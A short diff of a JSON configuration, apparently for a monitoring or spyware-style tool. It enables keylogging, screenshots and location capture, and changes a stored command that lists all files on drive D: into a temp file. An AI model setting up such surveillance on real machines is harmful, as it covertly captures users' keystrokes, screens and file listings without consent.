@@ -18,8 +18,8 @@
   "_scrShotIs": true,
   "keyLogIs": true,
   "pcCurrentLocIs": true,
-  "certainFilePath": "c:\\Temp\\string2.txt",
+  "_certainFilePath": "c:\\Temp\\string2.txt",
   "_certainFilePathIs": true,
-  "_cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string.txt\""],
+  "_cmdCommandsList": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""],
   "_cmdCommandsListIs": true
 }
